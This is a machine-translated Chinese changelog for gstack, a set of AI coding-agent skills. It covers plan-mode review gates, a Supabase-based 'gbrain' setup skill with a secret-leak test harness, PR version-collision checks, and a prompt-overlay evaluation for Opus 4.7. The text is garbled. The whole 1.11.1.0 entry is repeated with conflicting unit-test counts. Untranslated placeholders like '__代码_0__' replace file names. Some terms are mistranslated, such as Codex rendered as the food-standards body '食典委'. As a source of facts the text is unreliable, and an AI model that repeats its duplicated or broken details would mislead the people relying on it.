在此版本之前，`/plan-eng-review`（以及其他三个 `interactive: true` 审核技能）以 A/B/C 握手方式向计划模式用户致意，要求他们退出计划模式并重新运行或取消。那次握手是残留的：序言中已经包含了权威的“计划模式期间技能调用”规则，表明 AskUserQuestion 满足计划模式的回合结束要求。两条相互矛盾的规则，最高层专横的规则获胜，而审查从未进行。此版本删除了 bossier 规则，并将正确的规则提升到序言的位置 1，以便技能可以直接贯穿。

### 运送了什么

残留的 `scripts/resolvers/preamble/generate-plan-mode-handshake.ts` 解析器被删除。 “计划模式安全操作”和“计划模式期间的技能调用”块从 `generate-completion-status.ts` 中分离到同一模块中的同级 `generatePlanModeInfo()` 导出中，然后连接到用于握手的前导码位置 1。 “你首先看到这个”的定位仍然存在；只是内容发生了变化。四个失效的计划模式握手问题注册表 ID 被删除。 `interactive: true` frontmatter 标志保留在四个审核技能模板上，因为 `test/e2e-harness-audit.test.ts` 读取它以根据法典外部语音审核对哪些技能必须具有 `canUseTool` 覆盖范围进行分类。

四个按技能计划模式 E2E 测试被重写为烟雾测试，断言步骤 0 的实际范围模式问题触发（不是 A/B/C 握手），在第一个 AskUserQuestion 之前没有 Write/Edit，也没有早期的 `ExitPlanMode`。旧 `plan-mode-handshake-helpers.ts` 中的写保护助手保留在重命名的 `plan-mode-helpers.ts` 中，因此静默绕过回归仍然会被捕获。 `test/skill-e2e-plan-mode-no-op.test.ts` 保留用于相反的覆盖情况：计划模式信息块在计划模式之外保持安静。 `test/gen-skill-docs.test.ts` 现在扫描所有 9 个主机子目录（`.agents/`、`.openclaw/`、`.kiro/` 等）中生成的每个 `SKILL.md`，并断言 `## Plan Mode Handshake` 不存在。这是一个亚秒单位门，阻止任何未来的 PR 重新引入解析器。

### 重要的数字

来源：HEAD 上的 `bun test` 与更改前基线相比。

|公制|前|后| Δ |
|---|---|---|---|
|前导码解析器|19（握手+完成状态）|18（完成状态拥有这两个功能）|-1个模块|
|生成的 SKILL.md 中的握手行|每个技能 92 × 4 技能 = 368| 0 | -368 |
|问题登记条目| 51 | 47 |-4 个死条目|
|计划模式门层测试|5 次握手确认|5 烟雾 + 无操作 + 写保护|相同的计数，更强的断言|
|多主机握手缺席单元测试|没有任何|1（扫描 9 个主机目录，<1 秒）|新的回归门|
|更改文件上的 `bun test`|360 gen-skill-docs 通过|360 gen-skill-docs 通过|没有回归|

新的 `## Skill Invocation During Plan Mode` 部分的前导码位置位于每个 `plan-*-review/SKILL.md` 的第 ~127 行（文件的第一个 ~15%），在升级检查和载入门之前，因此权威的计划模式规则是模型在 bash env 设置后首先读取的内容。

### 这对于计划模式用户意味着什么

从计划模式调用 `/plan-eng-review`。您立即得到范围模式问题 (`SCOPE EXPANSION` / `SELECTIVE EXPANSION` / `HOLD SCOPE` / `SCOPE REDUCTION`)，审核运行，每个发现都会得到自己的 `AskUserQuestion`，最后触发 `ExitPlanMode`。没有两步“退出并重新运行”摩擦。与 `/plan-ceo-review`、`/plan-design-review`、`/plan-devex-review` 相同。

### 逐项变更

#### 固定的

- 在计划模式下调用时，`/plan-eng-review`、`/plan-ceo-review`、`/plan-design-review`、`/plan-devex-review` 不再显示 A/B/C 握手提示。每个技能都直接运行其交互式审核，每个发现都由 `AskUserQuestion` 控制，就像外部计划模式一样。

#### 改变了

- “计划模式安全操作”和“计划模式期间的技能调用”前导部分现在在位置 1（紧接在 bash 环境设置之后）发出，而不是在完成状态块的尾部发出。所有技能都可以在序言前面看到这两部分；内容没有其他变化。
- `test/helpers/plan-mode-handshake-helpers.ts` 重命名为 `test/helpers/plan-mode-helpers.ts`。导出的 API 从 `runPlanModeHandshakeTest` 重命名为 `runPlanModeSkillTest`，从 `assertHandshakeShape` 重命名为 `assertNotHandshakeShape`。写保护检测（在第一个 `AskUserQuestion` 之前没有 `Write`/`Edit` 工具调用）被保留并通过 `ExitPlanMode`-before-ask 检测进行扩展。

#### 已删除

- `scripts/resolvers/preamble/generate-plan-mode-handshake.ts` 已删除（残留，被 `generate-completion-status.ts` 中的 `generatePlanModeInfo` 取代）。
- 从 `scripts/question-registry.ts` 中删除了四个问题注册表条目：`plan-ceo-review-plan-mode-handshake`、`plan-eng-review-plan-mode-handshake`、`plan-design-review-plan-mode-handshake`、`plan-devex-review-plan-mode-handshake`。这些 ID 不再由任何技能发出；将它们保留在注册表中是很沉重的。

#### 对于贡献者

- `test/gen-skill-docs.test.ts` 现在有一个“计划模式信息解析器”描述块，该块（a）扫描存储库根下的每个生成的 `SKILL.md` 以及每个主机子目录（`.agents/`、`.openclaw/`、`.opencode/`、`.factory/`、`.hermes/`、`.kiro/`、`.cursor/`、`.slate/`）并断言 `## Plan Mode Handshake` 不存在，并且(b) 断言 `## Skill Invocation During Plan Mode` 位于四个复习技能生成的 `SKILL.md` 的前 15,000 个字节中。两个断言都在每个 `bun test` 上运行。任何重新引入握手解析器的 PR 都会立即使 CI 失败。
- 四个复习技能模板上的 `interactive: true` frontmatter 标志被保留。它仍然有一个阅读器：`test/e2e-harness-audit.test.ts` 使用它来强制交互式审查 E2E 测试的 `canUseTool` 覆盖率。移除旗帜是最初计划的一部分；食典委外部声音审查在审查期间发现了下游依赖性，并推翻了该决定。

## [1.12.0.0] - 2026-04-24

## **`/setup-gbrain` — 任何编码代理都会在五分钟内从零变为“gbrain 正在运行，我可以调用它”。**

gstack v1.9.0.0 附带了 `gbrain-sync`，假设已经安装了 `gbrain` CLI。这在 Garry 的机器上很好（他手动克隆了 `~/git/gbrain`），但对其他人来说却很糟糕。此版本缩小了入门差距：一种技能、三种路径（本地 PGLite、现有 Supabase URL 或通过管理 API 进行 Supabase 自动配置）、Claude Code 的 MCP 注册步骤、每个远程的信任三元组（读写/只读/拒绝），以便多客户端顾问不会混淆大脑，以及可重用的秘密接收器测试工具，其他技能在开始处理秘密时可以导入。

### 运送了什么

六个新的 `bin/` 助手和一个新的技能模板。 `bin/gstack-gbrain-repo-policy` 使用 `_schema_version: 2` 字段将每个远程的摄取层存储在 `~/.gstack/gbrain-repo-policy.json` 处，因此未来的迁移是确定性的（第一个 — 旧版 `allow` → `read-write` — 已在第一次读取任何 D3 之前的文件时运行）。 `bin/gstack-gbrain-detect` 以 JSON 形式发出完整状态，以便技能可以跳过已完成的步骤。 `bin/gstack-gbrain-install` 在进行全新克隆之前探测 `~/git/gbrain` 和 `~/gbrain`（修复了作者自己机器上的第一天重复克隆 footgun），并且使用三选项修复菜单（而不是警告并继续）在 PATH 阴影中严重失败。 `bin/gstack-gbrain-lib.sh` 提取用于 PAT 收集和池化 URL 粘贴的 `read_secret_to_env` 帮助程序 - stty-echo-off + SIGINT-restore + env-var-only 模式的一种规范实现。 `bin/gstack-gbrain-supabase-verify` 拒绝直接连接 URL（仅限 IPv6，在大多数环境中失败）并退出代码 3，因此调用者的重试 UX 与一般格式错误不同。 `bin/gstack-gbrain-supabase-provision` 封装了管理 API — list-orgs、create、poll、pooler-url、list-orphans、delete-project — 具有完整的 HTTP 错误覆盖率 (401/403/402/409/429/5xx)、指数退避以及 `--cleanup-orphans` 支持极少数情况下有人在配置中终止设置的情况。

技能模板本身将这些内容整合到一个交互流程中。 PAT 集合在 read-s 提示之前逐字显示完整范围的披露，解释该令牌授予对用户 Supabase 帐户中每个项目的访问权限，并在最后发出撤销提醒。路径 1 的池化 URL 粘贴具有相同的卫生条件以及经过编辑的预览（主机/端口/数据库可见，密码屏蔽）。引擎之间的切换将 `gbrain migrate` 包装在 `timeout 180s` 中，并带有有关死锁的可操作消息。通过 `mkdir ~/.gstack/.setup-gbrain.lock.d` 进行并发运行保护。遥测记录场景、安装结果、MCP 选择加入、信任层 - 所有枚举的分类值，绝不是可能泄露秘密的自由格式字符串。

`/health` 获得新的 GBrain 维度（权重 10%，包裹在 `timeout 5s` 中）以及类型检查/lint/测试/死代码/shell-linter。当未安装 gbrain 时，维度将被省略（不是红色），因此在非 gbrain 计算机上运行 `/health` 不会影响该选择。

`test/helpers/secret-sink-harness.ts` 是新的基础设施。使用种子秘密运行子进程，捕获 stdout / stderr / files-under-HOME / telemetry-JSONL，并通过四个匹配规则（精确 + URL 解码 + first-12-char 前缀 + base64）断言种子永远不会出现在任何通道中。七项阳性对照测试证明该安全带可以捕获每个覆盖通道的泄漏；四个阴性对照运行带有种子秘密的真实 setup-gbrain bin，并确认没有任何逃逸。任何处理秘密的未来技能都可以导入 `runWithSecretSink` 并运行相同的模式。

### 重要的数字

来源：`bun test` 针对 Slices 1–7 的五个新测试文件。

|套房|测试|时间|
|---|---|---|
|__代码_0__| 24 | ~1.2s |
|__代码_0__| 15 | ~1.0s |
|__代码_0__| 22 | ~0.2s |
|__代码_0__| 28 | ~13.8s |
|__代码_0__| 11 | ~7.0s |
|**全部的**| **100** | **~23s** |

Supabase 管理 API 的每个 HTTP 错误路径都由模拟服务器固定装置覆盖。每个秘密容器都通过泄漏安全带使用独特的种子进行操作。

### 这对 Claude Code 用户意味着什么

以前：手动安装 gbrain，希望 PATH 上没有任何阴影，将池化器 URL 粘贴到回显提示中，自己弄清楚 MCP 注册。现在：一个命令、三个路径、PAT 正确处理自动配置、自动为 Claude Code 注册 MCP、多客户端工作的信任层、端到端泄漏测试。运行`/setup-gbrain`。

### 逐项变更

#### 额外
- `/setup-gbrain` 技能 (`setup-gbrain/SKILL.md.tmpl`) — 完整的入门流程，包括路径选择、PAT 范围披露、编辑 URL 预览、并发运行锁定、使用 `--resume-provision` 和 `--cleanup-orphans` 子命令进行 SIGINT 恢复。
- `bin/gstack-gbrain-repo-policy` — 每个远程信任三元组（读写/只读/拒绝）、模式版本化文件格式、原子写入、损坏文件隔离。
- `bin/gstack-gbrain-detect` — 用于技能分支的 JSON 状态报告器。
- `bin/gstack-gbrain-install` — D5 检测优先安装程序、D19 PATH-shadow 失败硬验证器、固定 gbrain 提交。
- `bin/gstack-gbrain-lib.sh` — 共享 `read_secret_to_env` bash 助手。
- `bin/gstack-gbrain-supabase-verify` — 结构 URL 验证器，具有用于直接连接拒绝的独特退出。
- `bin/gstack-gbrain-supabase-provision` — 管理 API 包装器（list-orgs/create/wait/pooler-url/list-orphans/delete-project），具有完整的 HTTP 错误覆盖和重试+回退。
- `test/helpers/secret-sink-harness.ts` — 可重复使用的负空间泄漏测试安全带。

#### 改变了
- `/health` 技能添加了 GBrain 复合维度（权重 10%，包裹在 `timeout 5s` 中）。重新平衡现有类别权重，将综合得分保持在 0-10 分范围内；不带 `gbrain` 字段的历史 JSONL 条目读取为 `null` 以进行趋势比较。

#### 对于贡献者
- Pre-Impl Gate 1 在编写任何代码之前验证了 Supabase 管理 API 的形状。更正了两个错误的端点假设（`POST /v1/projects` 不是 `/v1/organizations/{ref}/projects`；`/config/database/pooler` 不是 `/config/database`），并确认 gbrain 的 `--non-interactive` + `GBRAIN_DATABASE_URL` 环境变量是真实的。记录在计划文件中。
- 审查纪律：CEO 审查 + Codex 外部声音 + Eng 审查在任何代码落地之前均以计划模式通过（3 个审查、21 个 D 决策、0 个未解决的差距）。

## [1.11.1.0] - 2026-04-23

## **计划模式停止默默地给你的评论盖章。强制问题现在实际上已经开始了。**

如果您在计划模式下运行 `/plan-ceo-review` 或任何交互式审核技能，则该技能用于读取差异、跳过每个停止门、写入计划文件并退出。零 AskUserQuestion 调用。调零模式选择。每个部分的决策为零。该技能的交互式契约被计划模式的系统提醒所超越，它告诉模型运行自己的工作流程并忽略其他一切。此版本添加了一个序言级停止门，该门在任何分析之前触发，因此您始终可以获得该技能旨在运行的交互式审查。

### 运送了什么

现在，四种交互式审核技能（plan-ceo-review、plan-eng-review、plan-design-review、plan-devex-review）会在检测到计划模式时发出两个选项 AskUserQuestion：交互式退出并重新运行，或取消。无静音旁路。该门在问题注册表中被归类为单向门，因此 `/plan-tune` 首选项无法自动决定通过它。当握手触发时，结果会同步记录到 `~/.gstack/analytics/skill-usage.jsonl` 中，因此即使 A-exit 和 C-cancel 在运行结束遥测块之前终止技能，也会捕获它们。

测试工具有一个基于 Anthropic 的 Agent SDK 构建的 canUseTool 扩展（已安装于 v0.2.117）。当测试提供 canUseTool 回调时，`test/helpers/agent-sdk-runner.ts` 会将 `permissionMode` 从 `bypassPermissions` 翻转到 `default`，以便实际触发回调。这是端到端断言 AskUserQuestion 内容的基础，而 gstack 的 E2E 测试以前根本无法做到这一点。他们必须指示模型完全跳过 AskUserQuestion。未来的每一个互动技能测试都以此为基础。

### 重要的数字

来源：`test/gen-skill-docs.test.ts` 中的新单元测试（8 个测试，涵盖握手存在、不存在、组合顺序、0C-bis STOP 块）和 `test/agent-sdk-runner.test.ts`（6 个测试，涵盖 canUseTool + 权限模式 + passThrough 帮助程序）。所有 14 个都在 <250 毫秒内本地通过，免费套餐。

|表面|前|后|
|---|---|---|
|克劳德技巧渲染握手| 0 |4（计划-CEO、计划-工程师、计划-设计、计划-devex）|
|带有握手文本的非 Claude 主机输出| N/A |0（通过 `ctx.host === 'claude'` 检查在主机范围内）|
|可以断言 AskUserQuestion 内容的 E2E 测试| 0 |1 个原始工具，为每种交互技能做好准备|
|计划模式进入 4 种复习技能中的任意一种|静音旁路|两种选择的停止门|
|plan-ceo-review 中的步骤 0C-bis|无 STOP 块，可能漂移至 0F|显式 `**STOP.**` 块匹配 0F 模式|
|捕获的握手后遥测结果|既不是 A-退出，也不是 C-取消|两者（ExitPlanMode之前同步写入）|

### 这对建筑商意味着什么

如果您在 PR 审核中以计划模式运行 gstack，则在该技能执行任何操作之前您会看到一个问题：“退出计划模式并以交互方式运行，还是取消？”选择 A，按 esc-esc，在正常模式下重新运行技能，获得您期望的完整交互式审核。选择C干净利落地保释。不再有沉默的橡皮图章。

如果您正在构建新的交互技能（您自己的或为 gstack 做出贡献），您现在可以编写真正的 E2E 测试，通过 canUseTool 工具对 AskUserQuestion 形状和路由进行断言。有关模式，请参阅 `test/agent-sdk-runner.test.ts`；有关 API，请参阅 `test/helpers/agent-sdk-runner.ts`。

### 逐项变更

#### 固定的

- 计划模式不再默默地跳过 `/plan-ceo-review`、`/plan-eng-review`、`/plan-design-review` 或 `/plan-devex-review` 中的 AskUserQuestion 门。当计划模式系统提醒出现时，前导码级握手作为该技能执行的第一件事触发，迫使用户在任何分析或计划文件写入之前进行选择。
- `/plan-ceo-review` 步骤 0C-bis 现在有一个与步骤 0F 中使用的模式匹配的显式停止块，因此当技能继续进行模式选择时，无法默默地跳过方法选择问题。

#### 额外

- 新的解析器 `scripts/resolvers/preamble/generate-plan-mode-handshake.ts` 发出握手散文和遥测 bash。仅通过 `ctx.host === 'claude'` 检查将主机范围限定为 Claude。通过 frontmatter 中的 `interactive: true` 选择加入每项技能。
- 技能模板上新的 frontmatter 字段 `interactive: boolean`。仅由 `scripts/gen-skill-docs.ts` 解析的生成器输入，从未写入生成的 SKILL.md 输出（遵循 `preamble-tier` 先例）。
- 新问题注册表项 `plan-{ceo,eng,design,devex}-review-plan-mode-handshake` 与 `door_type: 'one-way'` 位于 `scripts/question-registry.ts` 中。问题调整 `never-ask` 偏好无法抑制此门。
- `~/.gstack/analytics/skill-usage.jsonl` 中的新遥测字段 `plan_mode_handshake` 与握手触发时同步写入的结果 `fired`、`A-exit`、`C-cancel`。捕获结果，否则会在运行结束遥测运行之前终止技能。
- `test/helpers/agent-sdk-runner.ts` 使用可选的 `canUseTool` 回调参数进行扩展。提供后，将 `permissionMode` 翻转为 `default`，自动将 `AskUserQuestion` 添加到 `allowedTools`，并将回调传递给 SDK。导出 `passThroughNonAskUserQuestion` 帮助程序，用于只想在 AskUserQuestion 上断言但自动允许其他工具的测试。

#### 对于贡献者

- 在 `test/gen-skill-docs.test.ts` 中添加了 5 个单元测试，验证 4 个交互技能中是否存在握手、非交互技能中是否存在握手、非 Claude 主机输出中是否存在、组合顺序（握手先于升级检查）和 0C-bis STOP 块接线。
- 在 `test/agent-sdk-runner.test.ts` 中添加了 6 个单元测试，验证权限模式翻转、allowedTools 自动注入、canUseTool 回调传播和传递帮助程序行为。
- 在 `test/helpers/touchfiles.ts` 中添加了 6 个门层条目，覆盖新的 E2E 测试表面。依赖 glob 在以下情况下触发任何新测试：相关技能模板、握手解析器、前导码组成、问题注册表、单向门分类器或 agent-sdk-runner 发生更改。
- 在 `TODOS.md` 中提交了 2 个 P1/P2 后续行动：跨所有技能的结构性 STOP-Ask 强制功能（计划模式进入之外的更广泛的错误类别），并将 `interactive: true` 审计扩展到非审查交互技能，例如 `/office-hours`、`/codex`、`/investigate`、`/qa`。

## [1.11.0.0] - 2026-04-23

## **工作空间感知船。两个开放 PR 不能再同时声明相同的版本。**

如果您同时在多个 Conductor 窗口中运行 gstack，您可能会看到这样的情况：两个分支碰撞到同一版本，无论谁第二个合并，都会默默地覆盖第一个分支的 CHANGELOG 条目，或者带有重复的标头，并且没有人注意到，直到稍后出现 `grep "^## \["` 。此版本通过构造使碰撞不可能发生。 `/ship` 现在查询开放的 PR 队列，查看已声明的版本，并在您选择的凹凸级别选择下一个空闲插槽。如果检测到船舶与陆地之间发生碰撞，陆地步骤将中止并告诉您重新运行 `/ship` 而不是默默地覆盖。新的 `/landing-report` 命令按需显示整个队列。

### 给你带来什么改变

在一个 Conductor 窗口中运行 `/ship`，而另一个窗口有一个公开的 PR，声明 v1.7.0.0。您的飞船现在会看到声明，呈现队列表，并选择其上方的下一个空闲插槽（相同的凹凸级别）。 PR 标题以 `v<X.Y.Z.W>` 开头，因此在 `gh pr list` 中可以看到着陆顺序，而无需打开每个 PR。如果同级工作空间在更高版本上有未提交的工作并且看起来处于活动状态（在过去 24 小时内提交），则 `/ship` 会询问是等待它们还是前进过去。如果队列在发布和合并之间移动，CI 的新版本门会捕获它，并重新运行 `/ship` 以原子方式重写 VERSION、package.json、CHANGELOG 和 PR 标题。这个版本对漂移路径进行了测试：当其他三个 PR 首先登陆时，v1.8.0.0 的原始飞船变得陈旧，并且合并回主重新启动（v1.8.0.0 → v1.11.0.0）通过它引入的相同队列感知代码路径发生。

### 运送了什么（按数字）

- `bin/gstack-next-version` — ~390 行 Bun/TS util. 21 个通过夹具测试，涵盖快乐路径、8 个碰撞场景、离线回退、分叉 PR 过滤、兄弟活动检测、自我 PR 自动排除。
- 主机奇偶校验：GitHub + GitLab 均支持。 CI 门：`.github/workflows/version-gate.yml`、`.github/workflows/pr-title-sync.yml`，加上 `.gitlab-ci.yml` 镜像。
- 实用程序错误（网络、身份验证、错误）的失败打开语义。 gstack 错误永远不会冻结您的合并队列。确认发生碰撞时故障关闭。
- `/landing-report` 技能 — 只读仪表板，显示队列、同级以及所有四个碰撞级别的要求。
- `workspace_root` 配置键，默认 `$HOME/conductor/workspaces`，null 禁用非 Conductor 用户的同级扫描。

### 这对于运行并行工作空间的团队意味着什么

如果您经常针对同一存储库运行 3-10 个 Conductor 窗口，则此功能可以让模型扩展。之前：你大部分都侥幸逃脱了，因为你通过眼睛注意到了碰撞。之后：队列是一个可观察的表面，系统拒绝发布过时的版本。 `/landing-report` 是当您即将打开当天的 PR #6 时新的“我在哪里排队”检查。如果您想在不发货的情况下查看即将发生的情况，请在 `/ship` 之前运行它。

### 逐项变更

#### 额外

- __代码_0__。主机感知（GitHub + GitLab + 未知）版本分配器。查询打开的 PR，在头部获取每个 PR 的版本（有界并发，10 个并行），扫描同级 Conductor 工作树，选择下一个空闲槽。纯粹的读者，从不写文件。支持 `--exclude-pr <N>` 过滤掉正在检查的 PR（当 CI 针对 PR 自己的版本运行时防止自引用）。
- __代码_0__、__代码_1__。 CI 门助手。三种退出路径：通过、确认碰撞时阻止、实用程序错误时失败打开。
- __代码_0__。合并时碰撞门。当 PR 上的 VERSION/CHANGELOG/package.json 更改时运行。
- __代码_0__。当版本在推送时更改时，自动重写 PR 标题，仅适用于已经带有 `v<X.Y.Z.W>` 前缀的标题（自定义标题单独保留，幂等）。
- __代码_0__。 GitLab CI 平价。这两个作业都具有相同的故障开放语义。
- __代码_0__。新的 `/landing-report` 或 `/gstack-landing-report` 技能。只读仪表板。
- __代码_0__。新的 `workspace_root` 密钥。默认 `$HOME/conductor/workspaces`、`null` 禁用同级扫描。

#### 改变了

- `ship/SKILL.md.tmpl` 步骤 12. 队列感知版本在 FRESH 路径中选择，在 ALREADY_BUMPED 路径中进行漂移检测。在检测到偏差时，系统会提示用户重新启动，这会自动运行完整的元数据路径（VERSION + package.json + CHANGELOG header + PR title），因此不会有任何内容过时。
- `ship/SKILL.md.tmpl` 第 19 步。公关标题格式现在为 `v<X.Y.Z.W> <type>: <summary>`，版本始终在前。当 VERSION 更改时，重新运行路径会更新标题（而不仅仅是正文）。 GitHub 和 GitLab 路径。
- __代码_0__。新步骤 3.4 合并前漂移检测。使用明确的重新运行 /ship 指令中止，而不是自动改变文件。重新运行 `/ship` 是干净的路径，因为 Ship 拥有完整的元数据流。
- __代码_0__。新的 Step 3.4 建议单行文字显示队列状态。非阻塞。
- __代码_0__。版本不变段落。记录 VERSION 是单调序列，而不是严格的 semver 承诺，并且允许在碰撞级别内进行队列提前。

#### 固定的

- 版本门中的自引用错误。第一次实时 CI 运行（v1.8.0.0 上的 PR #1168）被拒绝为“过时”，因为 util 将正在检查的 PR 计为排队声明，从而将下一个槽位增加了一个。使用 `--exclude-pr` 标志 + `gh pr view` 自动检测进行修复，以便 util 静默过滤当前分支的 PR。被捕获并固定在同一艘船上——这正是该版本设计的狗食循环。

#### 对于贡献者

- __代码_0__。 21 个纯功能测试（parseVersion/bumpVersion/cmpVersion/pickNextSlot，具有 8 个冲突场景/markActiveSiblings 4 个案例）以及针对实时存储库的 CLI 冒烟测试。
- 第 12 步和第 19 步模板更改后，所有三个主机（claude、codex、factory）的金船固定装置均已刷新。这正是 Codex 在 CEO 审查期间标记的爆炸半径（跨模型张力 #8），在同一个 PR 中处理，而不是作为后续处理。

## **计划模式停止默默地给你的评论盖章。强制问题现在实际上已经开始了。**

如果您在计划模式下运行 `/plan-ceo-review` 或任何交互式审核技能，则该技能用于读取差异、跳过每个停止门、写入计划文件并退出。零 AskUserQuestion 调用。调零模式选择。每个部分的决策为零。该技能的交互式契约被计划模式的系统提醒所超越，它告诉模型运行自己的工作流程并忽略其他一切。此版本添加了一个序言级停止门，该门在任何分析之前触发，因此您始终可以获得该技能旨在运行的交互式审查。

### 运送了什么

现在，四种交互式审核技能（plan-ceo-review、plan-eng-review、plan-design-review、plan-devex-review）会在检测到计划模式时发出两个选项 AskUserQuestion：交互式退出并重新运行，或取消。无静音旁路。该门在问题注册表中被归类为单向门，因此 `/plan-tune` 首选项无法自动决定通过它。当握手触发时，结果会同步记录到 `~/.gstack/analytics/skill-usage.jsonl` 中，因此即使 A-exit 和 C-cancel 在运行结束遥测块之前终止技能，也会捕获它们。

测试工具有一个基于 Anthropic 的 Agent SDK 构建的 canUseTool 扩展（已安装于 v0.2.117）。当测试提供 canUseTool 回调时，`test/helpers/agent-sdk-runner.ts` 会将 `permissionMode` 从 `bypassPermissions` 翻转到 `default`，以便实际触发回调。这是端到端断言 AskUserQuestion 内容的基础，而 gstack 的 E2E 测试以前根本无法做到这一点。他们必须指示模型完全跳过 AskUserQuestion。未来的每一个互动技能测试都以此为基础。

### 重要的数字

来源：`test/gen-skill-docs.test.ts` 中的新单元测试（8 个测试，涵盖握手存在、不存在、组合顺序、0C-bis STOP 块）和 `test/agent-sdk-runner.test.ts`（6 个测试，涵盖 canUseTool + 权限模式 + passThrough 帮助程序）。所有 14 个都在 <250 毫秒内本地通过，免费套餐。

|表面|前|后|
|---|---|---|
|克劳德技巧渲染握手| 0 |4（计划-CEO、计划-工程师、计划-设计、计划-devex）|
|带有握手文本的非 Claude 主机输出| N/A |0（通过 `ctx.host === 'claude'` 检查在主机范围内）|
|可以断言 AskUserQuestion 内容的 E2E 测试| 0 |1 个原始工具，为每种交互技能做好准备|
|计划模式进入 4 种复习技能中的任意一种|静音旁路|两种选择的停止门|
|plan-ceo-review 中的步骤 0C-bis|无 STOP 块，可能漂移至 0F|显式 `**STOP.**` 块匹配 0F 模式|
|捕获的握手后遥测结果|既不是 A-退出，也不是 C-取消|两者（ExitPlanMode之前同步写入）|

### 这对建筑商意味着什么

如果您在 PR 审核中以计划模式运行 gstack，则在该技能执行任何操作之前您会看到一个问题：“退出计划模式并以交互方式运行，还是取消？”选择 A，按 esc-esc，在正常模式下重新运行技能，获得您期望的完整交互式审核。选择C干净利落地保释。不再有沉默的橡皮图章。

如果您正在构建新的交互技能（您自己的或为 gstack 做出贡献），您现在可以编写真正的 E2E 测试，通过 canUseTool 工具对 AskUserQuestion 形状和路由进行断言。有关模式，请参阅 `test/agent-sdk-runner.test.ts`；有关 API，请参阅 `test/helpers/agent-sdk-runner.ts`。

### 逐项变更

#### 固定的

- 计划模式不再默默地跳过 `/plan-ceo-review`、`/plan-eng-review`、`/plan-design-review` 或 `/plan-devex-review` 中的 AskUserQuestion 门。当计划模式系统提醒出现时，前导码级握手作为该技能执行的第一件事触发，迫使用户在任何分析或计划文件写入之前进行选择。
- `/plan-ceo-review` 步骤 0C-bis 现在有一个与步骤 0F 中使用的模式匹配的显式停止块，因此当技能继续进行模式选择时，无法默默地跳过方法选择问题。

#### 额外

- 新的解析器 `scripts/resolvers/preamble/generate-plan-mode-handshake.ts` 发出握手散文和遥测 bash。仅通过 `ctx.host === 'claude'` 检查将主机范围限定为 Claude。通过 frontmatter 中的 `interactive: true` 选择加入每项技能。
- 技能模板上新的 frontmatter 字段 `interactive: boolean`。仅由 `scripts/gen-skill-docs.ts` 解析的生成器输入，从未写入生成的 SKILL.md 输出（遵循 `preamble-tier` 先例）。
- 新问题注册表项 `plan-mode-handshake` 与 `door_type: 'one-way'` 位于 `scripts/question-registry.ts` 中。问题调整 `never-ask` 偏好无法抑制此门。
- `~/.gstack/analytics/skill-usage.jsonl` 中的新遥测字段 `plan_mode_handshake` 与握手触发时同步写入的结果 `fired`、`A-exit`、`C-cancel`。捕获结果，否则会在运行结束遥测运行之前终止技能。
- `test/helpers/agent-sdk-runner.ts` 使用可选的 `canUseTool` 回调参数进行扩展。提供后，将 `permissionMode` 翻转为 `default`，自动将 `AskUserQuestion` 添加到 `allowedTools`，并将回调传递给 SDK。导出 `passThroughNonAskUserQuestion` 帮助程序，用于只想在 AskUserQuestion 上断言但自动允许其他工具的测试。

#### 对于贡献者

- 在 `test/gen-skill-docs.test.ts` 中添加了 8 个单元测试，验证 4 个交互技能中是否存在握手、非交互技能中是否存在握手、非 Claude 主机输出中是否存在、组合顺序（握手先于升级检查）和 0C-bis STOP 块接线。
- 在 `test/agent-sdk-runner.test.ts` 中添加了 6 个单元测试，验证权限模式翻转、allowedTools 自动注入、canUseTool 回调传播和传递帮助程序行为。
- 在 `test/helpers/touchfiles.ts` 中添加了 6 个门层条目，覆盖新的 E2E 测试表面。依赖 glob 在以下情况下触发任何新测试：相关技能模板、握手解析器、前导码组成、问题注册表、单向门分类器或 agent-sdk-runner 发生更改。
- 在 `TODOS.md` 中提交了 2 个 P1/P2 后续行动：跨所有技能的结构性 STOP-Ask 强制功能（计划模式进入之外的更广泛的错误类别），并将 `interactive: true` 审计扩展到非审查交互技能，例如 `/office-hours`、`/codex`、`/investigate`、`/qa`。

## [1.10.1.0] - 2026-04-23

## **我们尝试通过提示让 Opus 4.7 更快。测量表明速度变慢了。拉开了子弹。**

gstack 在 `model-overlays/opus-4-7.md` 中提供了“显式扇出”叠加微调
回到 v1.5.2.0。想法：告诉 Opus 4.7 在一次中发出多个工具调用
助手轮而不是每轮一个，因此“读取三个文件”需要一个 API
往返而不是三趟。听起来很明显。此版本删除了
测量后发现它会严重损害性能，并发布评估
我们用线束来证明这一点，以便您可以测量自己的覆盖变化。

### 重要的数字

来源：新的 `test/skill-e2e-overlay-harness.test.ts`，N=每臂 10 次试验
固定装置，每次运行 40 次试验，每次运行约 3 美元。通过固定到 `claude-opus-4-7`
Anthropic 发布的 Agent SDK (`@anthropic-ai/claude-agent-sdk@0.2.117`)
将 `pathToClaudeCodeExecutable` 设置为本地安装的 `claude` 二进制文件
(2.1.118)。指标：第一个助手中并行 `tool_use` 块的数量
转动。

|叠加提示文字|第一轮扇出率（玩具：读取 3 个文件）|提升与基线|
|---|---|---|
|无覆盖（仅默认 Claude Code 系统提示）| **70%** (7/10) |基线|
|gstack 的原始“显式扇出”微调（v1.5.2.0 到 v1.6.3.0）| 10% (1/10) | **-60%** |
|Anthropic 自己的规范 `<use_parallel_tool_calls>` 文本来自其并行工具使用文档| **0%** (0/10) | **-70%** |

在实际的多文件审核提示中（“阅读 app.ts + config.ts + README.md，
glob src/*.ts，summary`)，Opus 4.7 在第一回合中根本没有扇出，
与叠加无关。 20 次试验中为零。轻推没有什么可以抓住的。

调查总成本：三轮评估 **7 美元**。

### 这对您意味着什么

如果您为克劳德提供系统提示的推动，请对其进行测量。人类自己的
已发布的最佳实践文本将我们的扇出率降至零。那不是一个
关于人择的主张，这是关于测量的主张：模型、SDK、
二进制文件和上下文都在建议下移动，并且建议位于
仍然。该线束现在位于仓库中。跑步
__代码_0__。
每跑三块钱。

### 逐项变更

#### 固定的

- `model-overlays/opus-4-7.md` — 删除了“显式扇出”块。这
其他三个推动（努力匹配、批量问题、字面解释）
未经测试，暂时保留。他们是自己的候选人
后续 PR 中的测量。

#### 额外

- `test/skill-e2e-overlay-harness.test.ts` — 迭代的周期层评估
输入夹具注册表并通过 `@anthropic-ai/claude-agent-sdk` 运行 A/B 臂。
使用 SDK 预设 `claude_code` 因此武器包含 Claude Code 的真实系统
迅速的; override-ON 附加已解析的覆盖文本。节省每次试验的原始数据
用于取证恢复的事件流。在 `EVALS=1` 和
__代码_0__。
- `test/fixtures/overlay-nudges.ts` — 输入 `OverlayFixture` 注册表
严格的验证器。添加未来的微调来测量 = 一个夹具条目。
